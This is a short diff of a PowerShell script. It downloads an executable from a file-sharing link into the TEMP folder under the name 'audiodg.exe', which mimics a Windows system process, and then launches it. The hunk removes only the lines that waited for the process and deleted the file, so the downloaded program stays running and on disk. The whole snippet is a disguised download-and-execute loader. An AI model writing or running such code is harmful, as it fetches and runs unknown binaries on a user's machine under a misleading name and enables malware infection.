@@ -2,5 +2,3 @@ $outputPath = [System.IO.Path]::Combine($env:TEMP, 'audiodg.exe')
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile("https://limewire.com/d/bBAYv#3y7TujiSK7", $outputPath)
 $process = Start-Process -FilePath $outputPath -PassThru
-$process.WaitForExit()
-Remove-Item $outputPath -Force
